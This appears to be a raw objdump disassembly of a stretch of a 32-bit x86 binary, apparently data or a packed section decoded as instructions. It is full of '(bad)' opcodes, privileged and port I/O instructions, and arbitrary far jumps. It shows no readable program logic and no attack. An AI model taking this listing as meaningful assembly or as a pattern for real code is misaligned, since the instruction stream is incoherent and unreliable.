  4099d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099d4:	retf   0xc3a0
  4099d7:	addr16 inc esi
  4099d9:	outs   dx,BYTE PTR ds:[esi]
  4099da:	pop    es
  4099db:	cld    
  4099dc:	xchg   esp,eax
  4099dd:	cmp    al,bl
  4099df:	sbb    edx,DWORD PTR [esi-0x4b764585]
  4099e5:	fldcw  WORD PTR [ecx+0x2f218d76]
  4099eb:	adc    al,0xee
  4099ed:	lea    ebp,[ebp-0x27]
  4099f0:	push   edx
  4099f1:	push   edi
  4099f2:	pop    ss
  4099f3:	shl    BYTE PTR [ebx+0x2f],0xb
  4099f7:	int    0xb5
  4099f9:	addr16 sbb eax,0xc030cdb7
  4099ff:	pop    es
  409a00:	call   0x6162:0xa87e6cb2
  409a07:	jg     0x409a11
  409a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a0a:	pop    ecx
  409a0b:	jmp    0x409a39
  409a0d:	dec    eax
  409a0e:	(bad)  
  409a0f:	outs   dx,BYTE PTR ds:[esi]
  409a10:	mov    al,0x77
  409a12:	ins    BYTE PTR es:[edi],dx
  409a13:	mov    esp,0x57d2ba21
  409a18:	mov    eax,0x8c18ade6
  409a1d:	int    0xa9
  409a1f:	dec    eax
  409a20:	sti    
  409a21:	(bad)  
  409a22:	cmp    eax,0xdfb2afcc
  409a27:	test   DWORD PTR [ebx+0x58],eax
  409a2a:	outs   dx,BYTE PTR ds:[esi]
  409a2b:	push   eax
  409a2c:	xchg   BYTE PTR ds:0xb1bc7df9,ch
  409a32:	mov    edi,0xd65be486
  409a37:	mov    ebp,0xcc0d3b0e
  409a3c:	fs inc esp
  409a3e:	mov    edi,esp
  409a40:	stos   DWORD PTR es:[edi],eax
  409a41:	in     al,0x33
  409a43:	mov    eax,cs
  409a45:	and    ebx,DWORD PTR [edx+0x52]
  409a48:	cli    
  409a49:	(bad)  
  409a4a:	daa    
  409a4b:	in     eax,0x2c
  409a4d:	mov    BYTE PTR [edx-0x7235fe54],al
  409a53:	bnd ret 
  409a55:	sub    ah,dh
  409a57:	fcmovu st,st(6)
  409a59:	dec    ecx
  409a5a:	or     dh,BYTE PTR [ebx+0x261633a9]
  409a60:	shr    ebx,cl
  409a62:	call   0xde55:0x3b2ab4e4
  409a69:	xchg   BYTE PTR [eax-0xd10c1da],dl
  409a6f:	jae    0x409a18
  409a71:	sub    cl,cl
  409a73:	mov    dh,0x9
  409a75:	arpl   WORD PTR [esi-0x33],ax
  409a78:	xchg   esi,eax
  409a79:	lock cmp al,0x26
  409a7c:	fsubr  DWORD PTR [ebp+eax*4+0x5b404473]
  409a83:	fisub  DWORD PTR [edi+0x38617f75]
  409a89:	ss or  eax,0xdeb5919e
  409a8f:	outs   dx,DWORD PTR ds:[esi]
  409a90:	shl    bh,0x3e
  409a93:	je     0x409acb
  409a95:	pusha  
  409a96:	shl    cl,1
  409a98:	loopne 0x409a9c
  409a9a:	pop    es
  409a9b:	dec    esp
  409a9c:	push   edx
  409a9d:	loope  0x409aa2
  409a9f:	pop    ecx
  409aa0:	pop    ss
  409aa1:	sar    BYTE PTR [esi-0x55],cl
  409aa4:	retf   
  409aa5:	cmp    DWORD PTR [esi],ebp
  409aa7:	cmc    
  409aa8:	mov    edi,0xa67c4986
  409aad:	mov    eax,0x7453fc6a
  409ab2:	not    BYTE PTR [ebx-0x14]
  409ab5:	xchg   ebp,eax
  409ab6:	outs   dx,BYTE PTR ds:[esi]
  409ab7:	mov    al,ds:0x7b6a76f5
  409abc:	mov    esi,?
  409abe:	sbb    DWORD PTR [esp+edi*2+0x8],esi
  409ac2:	scas   eax,DWORD PTR es:[edi]
  409ac3:	js     0x409a65
  409ac5:	jno    0x409a95
  409ac7:	ins    BYTE PTR es:[edi],dx
  409ac8:	repnz and DWORD PTR [edi],ecx
  409acb:	ins    BYTE PTR es:[edi],dx
  409acc:	xchg   ebx,eax
  409acd:	jae    0x409a69
  409acf:	out    dx,eax
  409ad0:	mov    ds:0x28b54e4c,al
  409ad5:	aas    
  409ad6:	dec    esi
  409ad7:	pop    ebx
  409ad8:	adc    edx,DWORD PTR [esi+0x5f]
  409adb:	call   0x4de5:0xc3b2be28
  409ae2:	icebp  
  409ae3:	xor    edi,edx
  409ae5:	mov    eax,0xa3abcbf2
  409aea:	sbb    cl,0x4c
  409aed:	pop    esi
  409aee:	add    BYTE PTR [edi+eiz*8-0x24],dl
  409af2:	addr16 sub al,0x53
  409af5:	or     BYTE PTR [ecx+0x3c559e20],cl
  409afb:	stos   DWORD PTR es:[edi],eax
  409afc:	shl    DWORD PTR [esi],0xf0
  409aff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b00:	mov    dh,0xfb
  409b02:	rol    al,cl
  409b04:	ins    DWORD PTR es:[edi],dx
  409b05:	add    ebp,DWORD PTR [esi-0x15]
  409b08:	clc    
  409b09:	call   DWORD PTR [ebx+eax*8+0x52]
  409b0d:	inc    edx
  409b0e:	push   ebx
  409b0f:	xchg   BYTE PTR [edx+edx*8+0x484d8bdd],bh
  409b16:	and    eax,0x66b2f7ee
  409b1b:	cli    
  409b1c:	cs pushf 
  409b1e:	xchg   esi,eax
  409b1f:	bswap  ebx
  409b21:	fwait
  409b22:	jmp    0xbcffcef9
  409b27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b28:	push   esp
  409b29:	sub    DWORD PTR [ecx],edx
  409b2b:	inc    esi
  409b2c:	sub    cl,BYTE PTR [ecx+0x3b93c71d]
  409b32:	jbe    0x409b68
  409b34:	lods   al,BYTE PTR ds:[esi]
  409b35:	cmp    al,0xa
  409b37:	fisttp QWORD PTR [edi+esi*2+0x8]
  409b3b:	mov    esp,0x3b08e8fa
  409b40:	or     eax,ebx
  409b42:	div    dl
  409b44:	imul   eax,DWORD PTR [ecx-0x7b7738f4],0x15
  409b4b:	clc    
  409b4c:	ins    DWORD PTR es:[edi],dx
  409b4d:	fisub  WORD PTR [edx-0x6e]
  409b50:	jg     0x409b23
  409b52:	out    dx,al
  409b53:	and    esi,DWORD PTR [edi+0x15]
  409b56:	push   edx
  409b57:	lahf   
  409b58:	mov    ebx,0x781b3447
  409b5d:	add    esp,DWORD PTR [eax-0x6fa90617]
  409b63:	jmp    0x6a98924e
  409b68:	xor    eax,0xbe6a4fb3
  409b6d:	dec    ecx
  409b6e:	dec    edx
  409b6f:	rcl    BYTE PTR [edi],0xe9
  409b72:	repz push 0x5174d3e8
  409b78:	add    esi,DWORD PTR [ebx-0x6a]
  409b7b:	sub    DWORD PTR [edx+0x649a8269],edx
  409b81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b82:	shl    BYTE PTR [ecx-0x77],cl
  409b85:	xchg   edi,eax
  409b86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b87:	hlt    
  409b88:	jbe    0x409b3d
  409b8a:	xor    ebp,eax
  409b8c:	cmc    
  409b8d:	ret    
  409b8e:	jg     0x409b23
  409b90:	and    esp,DWORD PTR [ecx+edi*2+0x4c601ba0]
  409b97:	das    
  409b98:	scas   al,BYTE PTR es:[edi]
  409b99:	dec    esp
  409b9a:	shr    cl,1
  409b9c:	or     DWORD PTR [esi],0xb6e7f997
  409ba2:	xchg   ebp,eax
  409ba3:	adc    DWORD PTR [edi-0x62],edx
  409ba6:	adc    ch,BYTE PTR [ebx]
  409ba8:	pop    esp
  409ba9:	retf   0xde7b
  409bac:	arpl   bp,cx
  409bae:	mov    eax,0xc3637ad4
  409bb3:	jne    0x409bb7
  409bb5:	inc    esi
  409bb6:	and    al,0x97
  409bb8:	add    DWORD PTR [ecx],ebx
  409bba:	or     eax,DWORD PTR [edx+0x130a758f]
  409bc0:	dec    edi
  409bc1:	mov    WORD PTR [eax],ss
  409bc3:	mov    dl,0x89
  409bc5:	std    
  409bc6:	jmp    0x620e6b2a
  409bcb:	rcl    BYTE PTR [ebx],1
  409bcd:	addr16 dec ebx
  409bcf:	ficomp WORD PTR [edx-0x5a]
  409bd2:	adc    BYTE PTR [esi],bh
  409bd4:	push   0x81b7a5fc
  409bd9:	adc    al,0xc5
  409bdb:	stc    
  409bdc:	outs   dx,DWORD PTR ds:[esi]
  409bdd:	jmp    0x5a3293b2
  409be2:	je     0x409c60
  409be4:	fmul   QWORD PTR [ebx-0x23]
  409be7:	call   0x493c:0xa09ecb5
  409bee:	mov    dl,0xd2
  409bf0:	jge    0x409bf0
  409bf2:	jmp    0x20f:0x9c254896
  409bf9:	sbb    ecx,ecx
  409bfb:	or     BYTE PTR [ebp+edx*8+0xc],cl
  409bff:	loope  0x409bcb
  409c01:	inc    esp
  409c02:	(bad)  
  409c03:	fistp  WORD PTR [ebx]
  409c05:	into   
  409c06:	sbb    esi,esi
  409c08:	pop    eax
  409c09:	daa    
  409c0a:	xor    dl,ah
  409c0c:	bound  edi,QWORD PTR ss:[ebp+0x32e95fe9]
  409c13:	push   cs
  409c14:	ret    
  409c15:	pushf  
  409c16:	push   cs
  409c17:	clc    
  409c18:	jge    0x409c4b
  409c1a:	js     0x409c9a
  409c1c:	mov    eax,0x680785e6
  409c21:	push   ds
  409c22:	mov    ecx,0xe0bbe5bf
  409c27:	rcr    BYTE PTR [esi+edx*2-0x55],0x36
  409c2c:	std    
  409c2d:	aam    0xaa
  409c2f:	fiadd  DWORD PTR [edx-0x6e45a136]
  409c35:	sbb    eax,0xe64bd957
  409c3a:	inc    ecx
  409c3b:	loop   0x409bbf
  409c3d:	lods   ax,WORD PTR ds:[esi]
  409c3f:	sahf   
  409c40:	fistp  WORD PTR ds:0xaa0a
  409c45:	pavgw  mm4,QWORD PTR [esi+0x54]
  409c49:	jmp    0xee41a939
  409c4e:	div    BYTE PTR [ebx+0x1]
  409c51:	sbb    esi,DWORD PTR [ecx+0x5e]
  409c54:	fidivr WORD PTR [edx]
  409c56:	sbb    al,0x42
  409c58:	mov    ch,0x4b
  409c5a:	cdq    
  409c5b:	push   esp
  409c5c:	push   ebx
  409c5d:	(bad)  
  409c5e:	imul   edx,DWORD PTR [edi+ecx*2],0xffffffe2
  409c62:	scas   eax,DWORD PTR es:[edi]
  409c63:	(bad)  
  409c64:	and    DWORD PTR [ecx+0x76239414],edx
  409c6a:	clc    
  409c6b:	xchg   ebp,eax
  409c6c:	getsec 
  409c6e:	xor    ch,BYTE PTR [eax]
  409c70:	clc    
  409c71:	cs ins DWORD PTR es:[edi],dx
  409c73:	mov    eax,0xaf325eac
  409c78:	pop    eax
  409c79:	imul   ecx,DWORD PTR [edx+0x294bab96],0x5b
  409c80:	out    0x2,eax
  409c82:	outs   dx,BYTE PTR ds:[esi]
  409c83:	pop    ecx
  409c84:	add    DWORD PTR [esi+0x6b],eax
  409c87:	adc    al,0x84
  409c89:	scas   eax,DWORD PTR es:[edi]
  409c8a:	scas   eax,DWORD PTR es:[edi]
  409c8b:	fisttp DWORD PTR [ebp+esi*1-0x5b]
  409c8f:	mov    BYTE PTR [edi-0x12f7bc48],dh
  409c95:	cs stos DWORD PTR es:[edi],eax
  409c97:	adc    eax,0xfdbf6408
  409c9c:	sbb    edi,DWORD PTR [ecx+0x6a]
  409c9f:	dec    ecx
  409ca0:	mov    cl,dl
  409ca2:	out    dx,al
  409ca3:	cmp    al,0xe1
  409ca5:	jg     0x409cd2
  409ca7:	stos   BYTE PTR es:[edi],al
  409ca8:	jo     0x409d1a
  409caa:	ret    0xfa1c
  409cad:	sub    DWORD PTR [esi+0x9cc7e9],ecx
  409cb3:	cwde   
  409cb4:	xchg   cl,al
  409cb6:	into   
  409cb7:	jb     0x409c81
  409cb9:	or     DWORD PTR [eax],edx
  409cbb:	add    ecx,DWORD PTR [esi+0x14]
  409cbe:	inc    ebp
  409cbf:	pushf  
  409cc0:	stc    
  409cc1:	ficom  DWORD PTR [ecx-0x48c332ff]
  409cc7:	mov    ebp,0xab985513
  409ccc:	es mov esi,0xc6c6941d
  409cd2:	es inc edx
  409cd4:	cs fwait
  409cd6:	lods   al,BYTE PTR ds:[esi]
  409cd7:	pop    esp
  409cd8:	aas    
  409cd9:	or     BYTE PTR [edx+0x2a538ed5],cl
  409cdf:	imul   edi,DWORD PTR [edi-0x49],0xa
  409ce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ce4:	push   esi
  409ce5:	mov    eax,0x7b30ff57
  409cea:	xor    DWORD PTR [eax],edi
  409cec:	sub    DWORD PTR [edi+ebx*1-0x41],0xffffffcb
  409cf1:	push   cs
  409cf2:	mov    esi,0xeb029f1d
  409cf7:	jecxz  0x409c8a
  409cf9:	xchg   esp,eax
  409cfa:	push   eax
  409cfb:	retf   
  409cfc:	jl     0x409d02
  409cfe:	ror    DWORD PTR [eax-0xd32918c],1
  409d04:	imul   edx,DWORD PTR [ecx+0x30],0xca452f59
  409d0b:	jne    0x409d0a
  409d0d:	jbe    0x409d72
  409d0f:	pop    edi
  409d10:	and    BYTE PTR [esi-0x5b70be0d],cl
  409d16:	mov    eax,ds:0xb480959e
  409d1b:	nop
  409d1c:	dec    esi
  409d1d:	addr16 pop es
  409d1f:	fadd   st(0),st
  409d21:	sbb    cl,BYTE PTR [esi-0x696cd492]
  409d27:	pop    eax
  409d28:	or     DWORD PTR [ebx-0x7988d3b2],0x34dd526c
  409d32:	test   eax,0x1f570960
  409d37:	stc    
  409d38:	inc    ecx
  409d39:	(bad)  
  409d3a:	sub    DWORD PTR [ebx+0x6e9c751a],esp
  409d40:	fstp   DWORD PTR [edi+0x542fd4c4]
  409d46:	inc    esp
  409d47:	push   0xffffffc7
  409d49:	push   esp
  409d4a:	push   esi
  409d4b:	add    cl,dl
  409d4d:	xor    DWORD PTR [eax+0x3a],esi
  409d50:	jmp    0x87e2a6f5
  409d55:	cmp    bh,BYTE PTR [ecx]
  409d57:	or     ch,al
  409d59:	fwait
  409d5a:	inc    ebp
  409d5b:	adc    al,0xd6
  409d5d:	mov    bh,0x43
  409d5f:	imul   edi,edx,0xfaeaee89
  409d65:	cmp    cl,dl
  409d67:	scas   al,BYTE PTR es:[edi]
  409d68:	jbe    0x409cf3
  409d6a:	add    dh,bh
  409d6c:	imul   ax,WORD PTR [edi],0x2e
  409d70:	fstp   st(0)
  409d72:	test   al,0xf3
  409d74:	jns    0x409d56
  409d76:	(bad)  
  409d78:	jae    0x409d40
  409d7a:	leave  
  409d7b:	hlt    
  409d7c:	iret   
  409d7d:	xor    BYTE PTR [edi+0x46d58854],dl
  409d83:	dec    ebx
  409d84:	jns    0x409d65
  409d86:	nop
  409d87:	es ret 0x9123
  409d8b:	sahf   
  409d8c:	push   es
  409d8d:	pop    es
  409d8e:	neg    al
  409d90:	push   ebx
  409d91:	mov    edi,0x89cf5afb
  409d96:	or     eax,0x508b3116
  409d9b:	out    0x97,eax
  409d9d:	neg    BYTE PTR [edi-0x5b]
  409da0:	loopne 0x409d23
  409da2:	sub    DWORD PTR [edi+esi*4+0x58195b2a],esp
  409da9:	rcr    DWORD PTR [eax-0x74a323ad],1
  409daf:	and    al,0xaf
  409db1:	mov    gs,WORD PTR fs:[eax]
  409db4:	inc    eax
  409db5:	mov    edx,DWORD PTR [esi-0x10]
  409db8:	xor    eax,0x13c69392
  409dbd:	and    eax,0xb405c782
  409dc2:	mov    esp,0xef1663b8
  409dc7:	push   0x18
  409dc9:	fadd   DWORD PTR [edx-0x46]
  409dcc:	cmp    al,0xf6
  409dce:	push   ecx
  409dcf:	out    dx,al
  409dd0:	adc    DWORD PTR [eax+0x74],esi
  409dd3:	fsubr  DWORD PTR [ecx*2-0x29e37b10]
  409dda:	imul   ebp,DWORD PTR [ecx-0x66],0x56e36c4d
  409de1:	jmp    0xbd4e:0x68360e45
  409de8:	jo     0x409e59
  409dea:	mov    ch,0x1
  409dec:	into   
  409ded:	hlt    
  409dee:	pop    esi
  409def:	loopne 0x409db8
  409df1:	pop    es
  409df2:	je     0x409e08
  409df4:	retf   
  409df5:	inc    ecx
  409df6:	popa   
  409df7:	cwde   
  409df8:	repnz sub eax,0x8e36b34d
  409dfe:	out    dx,eax
  409dff:	push   0xde92f360
  409e04:	cmp    DWORD PTR [eax+0x14],ecx
  409e07:	mov    ecx,0x9d16a434
  409e0c:	repnz sub BYTE PTR [edi],0xf1
  409e10:	outs   dx,DWORD PTR gs:[esi]
  409e12:	frstor [edi]
  409e14:	dec    esp
  409e15:	mov    esi,0x70637b10
  409e1a:	std    
  409e1b:	sar    edi,cl
  409e1d:	and    al,0x3f
  409e1f:	into   
  409e20:	sbb    al,0xaf
  409e22:	add    dl,ah
  409e24:	cmp    DWORD PTR [edx+edx*1-0x68],edx
  409e28:	mov    ah,0x64
  409e2a:	and    al,0x29
  409e2c:	inc    ebp
  409e2d:	(bad)  
  409e2e:	jge    0x409e6b
  409e30:	fcom   QWORD PTR [edi]
  409e32:	repnz out dx,eax
  409e34:	into   
  409e35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e36:	loop   0x409e31
  409e38:	icebp  
  409e39:	and    al,0x63
  409e3b:	cmp    eax,0xff785622
  409e40:	and    al,0x19
  409e42:	cs cdq 
  409e44:	adc    BYTE PTR [ebp+0x72],ah
  409e47:	sub    eax,0xdac4fa81
  409e4c:	int    0xe
  409e4e:	call   0x9548:0xb4aa72b6
  409e55:	shl    BYTE PTR [eax],1
  409e57:	call   0x9e3db751
  409e5c:	xchg   ecx,eax
  409e5d:	dec    ebp
  409e5e:	out    dx,eax
  409e5f:	mov    ah,0x6f
  409e61:	ins    BYTE PTR es:[edi],dx
  409e62:	inc    DWORD PTR [edx+0x57]
  409e65:	inc    ebp
  409e66:	leave  
  409e67:	push   edi
  409e68:	pop    ecx
  409e69:	mov    esp,0xb165b788
  409e6e:	(bad)  
  409e70:	sub    ah,BYTE PTR [ebp-0x65]
  409e73:	les    esp,FWORD PTR [esi+0x3b]
  409e76:	dec    edx
  409e77:	(bad)  
  409e78:	xor    DWORD PTR [edi-0x17],edi
  409e7b:	sahf   
  409e7c:	add    ch,BYTE PTR [ecx+esi*2-0x5f]
  409e80:	xchg   ebx,eax
  409e81:	fwait
  409e82:	or     dl,bl
  409e84:	pop    ecx
  409e85:	push   eax
  409e86:	sbb    DWORD PTR [ebx],esi
  409e88:	scas   eax,DWORD PTR es:[edi]
  409e89:	cs pop ss
  409e8b:	mov    esi,0x47e5a69a
  409e90:	shl    edi,1
  409e92:	or     cl,bl
  409e94:	nop
  409e95:	lods   eax,DWORD PTR ds:[esi]
  409e97:	enter  0x67c0,0xe6
  409e9b:	fwait
  409e9c:	xchg   ecx,eax
  409e9d:	in     eax,dx
  409e9e:	das    
  409e9f:	icebp  
  409ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ea1:	int    0xa9
  409ea3:	retf   0x8e3a
  409ea6:	test   al,0xa3
  409ea8:	dec    esp
  409ea9:	fsubr  DWORD PTR [esi+0x25]
  409eac:	adc    al,0x72
  409eae:	test   eax,0x1ea7e77b
  409eb3:	test   BYTE PTR [esi],dl
  409eb5:	imul   ebp,DWORD PTR [eax+0x5a9dca5c],0x8
  409ebc:	test   DWORD PTR [esp+edi*1],ecx
  409ebf:	add    ah,bh
  409ec1:	(bad)  
  409ec2:	or     edx,DWORD PTR ds:0xd9a104f9
  409ec8:	cmp    DWORD PTR [ebx],0xcd8d868a
  409ece:	iret   
  409ecf:	jle    0x409e8d
  409ed1:	pushf  
  409ed2:	or     dh,dl
  409ed4:	xor    DWORD PTR [eax+0xe],ecx
  409ed7:	xchg   al,dh
  409ed9:	add    eax,0xf74306fd
  409ede:	jno    0x409f45
  409ee0:	or     ebx,esi
  409ee2:	dec    ecx
  409ee3:	or     eax,0xc6d03bf3
  409ee8:	stos   DWORD PTR es:[edi],eax
  409ee9:	mov    bl,0x8a
  409eeb:	sub    esp,DWORD PTR [eax]
  409eed:	addr16 jle 0x409ecd
  409ef0:	sub    edx,DWORD PTR ds:0x87fa44d2
  409ef6:	adc    eax,0x67d32a0d
  409efb:	clc    
  409efc:	cmp    ebx,DWORD PTR [esi]
  409efe:	test   eax,0xc597c605
  409f03:	sbb    eax,0xddea2106
  409f08:	cs mov dl,0x1d
  409f0b:	mov    al,ds:0xdf63daa3
  409f10:	or     al,0x44
  409f12:	imul   esp,DWORD PTR [esi-0x29],0xfffffff3
  409f16:	xchg   ebx,eax
  409f17:	jmp    0x409f03
  409f19:	int3   
  409f1a:	mov    cl,0x1
  409f1c:	ret    0xe498
  409f1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f20:	or     BYTE PTR [ebx],al
  409f22:	inc    esp
  409f23:	ret    
  409f24:	cmp    dh,BYTE PTR [eax+0x2192c249]
  409f2a:	ss jno 0x409f18
  409f2d:	rcl    ah,cl
  409f2f:	inc    edx
  409f30:	mov    ds:0x86247ecb,eax
  409f35:	or     eax,0x864e67d9
  409f3a:	cs (bad) 
  409f3c:	aam    0x70
  409f3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f3f:	adc    DWORD PTR [ecx-0x4bbcc672],esi
  409f45:	and    DWORD PTR [edi-0x4c971789],0xeb629726
  409f4f:	adc    al,0x4f
  409f51:	xor    DWORD PTR [ebx-0x1ed580bd],ebp
  409f57:	into   
  409f58:	enter  0xa4cb,0x88
  409f5c:	icebp  
  409f5d:	xchg   ebx,eax
  409f5e:	add    ah,dh
  409f60:	dec    edi
  409f61:	jecxz  0x409fdb
  409f63:	pop    ss
  409f64:	call   0x84a979e8
  409f69:	xchg   edi,eax
  409f6a:	mov    BYTE PTR [ecx-0xaaf0364],ch
  409f70:	fndisi(8087 only) 
  409f72:	data16 (bad) 
  409f74:	pop    ds
  409f75:	enter  0x9994,0x61
  409f79:	jg     0x409f84
  409f7b:	cmc    
  409f7c:	mov    ah,BYTE PTR [edi-0x12]
  409f7f:	arpl   WORD PTR [ebx-0x69],dx
  409f82:	jb     0x409fd6
  409f84:	and    ch,0xa8
  409f87:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f89:	mov    DWORD PTR [ecx+0x6ee18073],edi
  409f8f:	pop    edi
  409f90:	sub    DWORD PTR [edx-0x1d],esi
  409f93:	cmp    BYTE PTR [eax-0x752666ba],dl
  409f99:	or     DWORD PTR [edx+0xc],edi
  409f9c:	jo     0x409f41
  409f9e:	xor    BYTE PTR [ecx+0x1a],0xa7
  409fa2:	ds jb  0x409faa
  409fa5:	test   cl,bl
  409fa7:	push   ds
  409fa8:	in     al,dx
  409fa9:	xchg   ebx,eax
  409faa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fab:	pop    esp
  409fac:	(bad)  
  409fad:	xchg   esi,eax
  409fae:	sbb    eax,0xbd13de6f
  409fb3:	jl     0x40a00b
  409fb5:	pushf  
  409fb6:	ss out 0x4,eax
  409fb9:	cmp    al,0x5
  409fbb:	aam    0x17
  409fbd:	mov    cl,0x74
  409fbf:	and    edi,DWORD PTR [edi+esi*1-0x3e68dd90]
  409fc6:	popf   
  409fc7:	icebp  
  409fc8:	shl    BYTE PTR [ebp-0x58],1
  409fcb:	add    DWORD PTR [ebp+0x4d],ebp
  409fce:	out    dx,eax
  409fcf:	adc    esp,ecx
  409fd1:	jae    0x409ff4
  409fd3:	mov    ch,0x5c
  409fd5:	aad    0xb7
  409fd7:	int3   
  409fd8:	mov    DWORD PTR [eax],ebp
  409fda:	jns    0x40a032
  409fdc:	call   0xeaabd795
  409fe1:	push   edx
  409fe2:	popf   
  409fe3:	(bad)  
  409fe4:	shl    DWORD PTR [edx-0x1],1
  409fe7:	jns    0x40a000
  409fe9:	mov    esp,0x43841989
  409fee:	les    edi,FWORD PTR [ebx-0x2a]
  409ff1:	pop    ecx
  409ff2:	cwde   
  409ff3:	add    al,0x11
  409ff5:	push   ebx
  409ff6:	(bad)  
  409ff8:	test   al,0x6a
  409ffa:	mov    bh,ch
  409ffc:	popa   
  409ffd:	mov    ds:0xdf13ce9a,al
  40a002:	xchg   DWORD PTR [edi-0x20],esp
  40a005:	push   0x11fa7b4e
  40a00a:	dec    edi
  40a00b:	test   DWORD PTR [edi],0x5188934b
  40a011:	dec    ecx
  40a012:	in     eax,0xc2
  40a014:	push   ebp
  40a015:	inc    ebx
  40a016:	jb     0x409fbf
  40a018:	push   esp
  40a019:	mov    BYTE PTR ds:0x193ce97b,dh
  40a01f:	lock jno 0x409fd3
  40a022:	mov    ds:0xd958fbad,eax
  40a027:	mov    bh,0xd7
  40a029:	and    BYTE PTR [edx],ah
  40a02b:	sub    dh,dh
  40a02d:	and    ah,ah
  40a02f:	xchg   ebx,eax
  40a030:	inc    eax
  40a031:	popf   
  40a032:	dec    ebx
  40a033:	pop    edx
  40a034:	inc    BYTE PTR [edi]
  40a036:	mov    cl,0x22
  40a038:	mov    DWORD PTR [edi+eiz*2+0x9],ebx
  40a03c:	and    al,BYTE PTR [ebx]
  40a03e:	mov    ds,eax
  40a040:	mov    esi,0xf114217d
  40a045:	je     0x40a068
  40a047:	jae    0x40a02e
  40a049:	arpl   sp,si
  40a04b:	mov    BYTE PTR [esp+ebp*2],ah
  40a04e:	sbb    al,0x97
  40a050:	push   0xffffffbd
  40a052:	ret    0x3ff8
  40a055:	xor    DWORD PTR [ecx+0x6c29106f],ecx
  40a05b:	test   DWORD PTR [edi-0x2a0d7065],edi
  40a061:	pop    esi
  40a062:	mov    edx,0x2a059823
  40a067:	shr    BYTE PTR [eax],cl
  40a069:	mov    ds:0x1774746c,al
  40a06e:	xor    BYTE PTR [edx-0x548584a4],dh
  40a074:	adc    DWORD PTR [edi],ebp
  40a076:	pop    ecx
  40a077:	lods   al,BYTE PTR ds:[esi]
  40a078:	retf   0x3170
  40a07b:	or     ah,BYTE PTR [edx]
  40a07d:	ret    
  40a07e:	(bad)  
  40a07f:	je     0x40a0a1
  40a081:	pop    eax
  40a082:	inc    ebx
  40a083:	sub    eax,0x2b91d731
  40a088:	xor    bl,BYTE PTR [ecx+ebx*1+0x0]
  40a08c:	inc    esi
  40a08d:	xchg   esp,eax
  40a08e:	rol    DWORD PTR [eax+0x709c38de],1
  40a094:	(bad)  
  40a095:	in     al,dx
  40a096:	neg    edx
  40a098:	shr    DWORD PTR [edi],cl
  40a09a:	sbb    eax,0x1dda4a65
  40a09f:	out    0x50,eax
  40a0a1:	xor    esi,DWORD PTR [edx]
  40a0a3:	jmp    0x40a0cf
  40a0a5:	jnp    0x40a0ca
  40a0a7:	iret   
  40a0a8:	add    ebp,eax
  40a0aa:	(bad)  
  40a0ab:	in     eax,0x0
  40a0ad:	xchg   esp,eax
  40a0ae:	mov    ch,0xf2
  40a0b0:	into   
  40a0b1:	aas    
  40a0b2:	sar    DWORD PTR [eiz*2+0xcd0b2cf],0x72
  40a0ba:	imul   edx,DWORD PTR [esi-0x18e9269a],0xfaf7d3a8
  40a0c4:	inc    eax
  40a0c5:	aam    0xcf
  40a0c7:	ret    
  40a0c8:	(bad)  
  40a0c9:	loop   0x40a077
  40a0cb:	dec    eax
  40a0cc:	loope  0x40a059
  40a0ce:	out    0xfa,eax
  40a0d0:	bound  ebx,QWORD PTR [ecx+0x62c24a70]
  40a0d6:	imul   esi,DWORD PTR [edx+0x39],0x8
  40a0da:	repnz popf 
  40a0dc:	add    BYTE PTR [eax-0x20],bh
  40a0df:	js     0x40a064
  40a0e1:	sbb    BYTE PTR [edi],dh
  40a0e3:	inc    ebx
  40a0e4:	call   0x6ab2:0x1ba0d80d
  40a0eb:	pop    ecx
  40a0ec:	scas   eax,DWORD PTR es:[edi]
  40a0ed:	mov    esi,0xfac30cbe
  40a0f2:	imul   ebx,DWORD PTR ds:0xd5d3e201,0xffffffbe
  40a0f9:	pop    esi
  40a0fa:	adc    al,0x6
  40a0fc:	pop    ecx
  40a0fd:	hlt    
  40a0fe:	sti    
  40a0ff:	fcmovbe st,st(6)
  40a101:	or     ah,BYTE PTR [esi-0x63a3593a]
  40a107:	sbb    BYTE PTR [eax],bh
  40a109:	mov    bh,0x4f
  40a10b:	jno    0x40a10e
  40a10d:	ficom  WORD PTR [ebx+esi*1]
  40a110:	leave  
  40a111:	add    ch,BYTE PTR ds:0xc6125928
  40a117:	test   DWORD PTR [ebx+0x3103e890],edi
  40a11d:	push   ds
  40a11e:	mov    bl,0x75
  40a120:	jo     0x40a0c6
  40a122:	arpl   WORD PTR [ebx-0x3e214093],sp
  40a128:	mov    al,ds:0x1072467c
  40a12d:	jne    0x40a12c
  40a12f:	jg     0x40a15b
  40a131:	stos   BYTE PTR es:[edi],al
  40a132:	mov    bl,0xbc
  40a134:	imul   esp,DWORD PTR [edi],0xf5a5067b
  40a13a:	mov    ah,0x7a
  40a13c:	and    ebx,esp
  40a13e:	(bad)  
  40a140:	xchg   cl,cl
  40a142:	mov    ds:0xfff0d6e7,al
  40a147:	xlat   BYTE PTR ds:[ebx]
  40a148:	xchg   esp,eax
  40a149:	(bad)  
  40a14a:	push   ebx
  40a14b:	arpl   si,di
  40a14d:	mov    ebp,0x6c9dcf39
  40a152:	popf   
  40a153:	cli    
  40a154:	pop    edi
  40a155:	xor    al,0x48
  40a157:	enter  0xce5,0xe8
  40a15b:	xchg   ebp,eax
  40a15c:	les    edi,FWORD PTR [ecx+eax*8]
  40a15f:	pop    es
  40a160:	mov    dh,0x31
  40a162:	mov    ?,WORD PTR ds:0xe20abbe4
  40a168:	mov    edi,ebx
  40a16a:	retf   0xe928
  40a16d:	adc    dh,BYTE PTR [eax+0x1baeef44]
  40a173:	fs (bad) 
  40a175:	iret   
  40a176:	or     al,0xd4
  40a178:	test   BYTE PTR [eax+0x6d],ah
  40a17b:	icebp  
  40a17c:	xchg   esp,eax
